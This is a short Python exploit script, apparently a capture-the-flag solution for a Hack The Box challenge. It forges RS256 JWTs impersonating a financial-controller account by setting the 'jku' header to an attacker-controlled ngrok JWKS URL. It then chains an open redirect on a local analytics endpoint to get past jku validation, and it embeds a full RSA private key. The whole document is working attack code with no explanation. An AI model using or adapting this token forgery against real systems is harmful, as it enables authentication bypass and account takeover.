import jwt
import datetime
# Replace with your ngrok URL
priv_key='-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAnDJKzuvAXkv1doV1odOfNkBId/Ur6y/WHzK7axn7P3agqYfj\nReuC1s1G3oIbQTXf5AE5CYJ+6EXNgrtofTEoPn1kY0ikT4Xg25fi9ajrVB7xxirM\n/Dh49/pO1NuJ5L9396ACSy0n87+peM+qRh1js5BZ0618ByP5MzAr4ta/ACTsEajJ\nkHayXQmTKgEA1SAf031bQCubOoWV1sAYBVLQoy8EhtvGtOisWlXatBp/3PX4JC48\ncbm19bIgzOizp8LrgkRWPGz/xFzfxoSqfIGxxToOCPytkmGM1qv8VOQxGROQIah+\nvM9ZAAvMndyx2ZDZ6kOsqoB9XMGqCyMAlNP35wIDAQABAoIBABh2GdgY/Jnn7Gug\n0ADFawgsfgznRPcCmVZudAJ8YagZNGUIZnPjQ6zPHhunpYwLW2JSPLP8D1Lh56Lj\nJaSBh8ttiMSxsiXQEhxhx4Xwa9ZTOErwFgUj9PHk7eaQ8SH1SFzr3qAWVMzsBabp\nYsGzRZNv9llbsHJP1G2LTDwspGHpp3V/c1YOT2tBFKpdZ9d4o518s5B3NTrYw82v\n2waxR/fxa4CDiHBUVOR4R40zX9UnJg+J3vb5si6gyGcisbdVPkUZZUwbskXqCnSx\nwut1jIn/MRBjxr2WYfDbPDZgC1WC1OrWAYkGU83Y85ChSKvUftOmmZcs/YnK/7HL\n9ZE3ZRUCgYEAtjer3x8PBYvuW1uUabTLW1lp81ig1CpParIJmVh0JXAXeTITTghL\nTLGY4iCoL/vtNxZKrIjAZVZ99SwvAN1VqSN7t1JCkKplOp+48mecag8eIG5Xisb5\nySlNjzjHTb4TCxrlx8/KZVpdCvjHQC2Ija0Zt5wYDDCmLCAeAWBaLyMCgYEA23FU\nlM1HKa28zJdcfBEESZsOASYKt3KixyyNq7Ic0nQyAojGgIjgo4VXERuPnnKzS36O\nm2ZoMawcz4291IM9vaD6RZtovnQ9ZpoJ0t1ZUFpWxD84q0jjp4LJhCd3xjiQfbOX\nRHmpmmj9k+XWxJEAthejrAEpTn6qwDvEkrl74m0CgYBRYENtfZ1jyL5GJnv9STSY\nMzJR7v7EQbD94UzQIuSb45dYFLjyXFnkglvYgOUbqNKji10F+HyTxTCzUWwcYrxi\nsOoLUL1Rhgd3SuV5vDPqWZ4GtcB6xam/4KY2lBDN81jl2LlNpsqowNZUlA3H543Y\nV7noedlzeDZ99knwK2ubKQKBgQCb6tFDDPvkJDrCT0V6LYkTV2VC8ampoH0B8akT\ndnE+IyspW89WomqiJOqxEBkiZrL4EAr5ZXDg4j5yRm67oShsJQXOEVcCA4tg7E/Q\nkE+WZSnDNHxqT1bZvXa7PGPA5o3bkpAHKj6UpMaPoD3R2olb2D4Fx6l2yU8/WPgZ\nnErmnQKBgDxUa89KtRMnhcrDOl4ZgypjG+VlBLl1H/th94k3g5q0XscemHjO7fl9\nS9BreAZKgt8vLRUXjXOt0/j35Vd3LlI0hk9w0spidSYuRqTfFyFKZUZeGYVoJxXc\nMzy7mWuTLoV8KrPgKbMjGgHmxsqEBaMJ5xLlW0zvjDw55saUkjxB\n-----END RSA PRIVATE KEY-----'
jku_url = 'https://4f21297445fc.ngrok-free.app/.well-known/jwks.json'
payload = {
'email': 'financial-controller@frontier-board.htb',
'iat': datetime.datetime.utcnow(),
'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=6)
}
headers = {
'alg': 'RS256',
'typ': 'JWT',
'kid': '6a7fbf00-d514-46ff-a6b6-65684a775284',
'jku': jku_url
}
forged_token = jwt.encode(payload, priv_key, algorithm='RS256', headers=headers)
print(f'Forged JWT: {forged_token}')
redirect_url = 'https://4f21297445fc.ngrok-free.app/.well-known/jwks.json' # Your malicious JWKS URL
exploit_jku = f'http://127.0.0.1:1337/api/analytics/redirect?ref=malicious&url={redirect_url}'
headers['jku'] = exploit_jku
forged_token = jwt.encode(payload, priv_key, algorithm='RS256', headers=headers)
print(f'Forged JWT with redirect: {forged_token}')
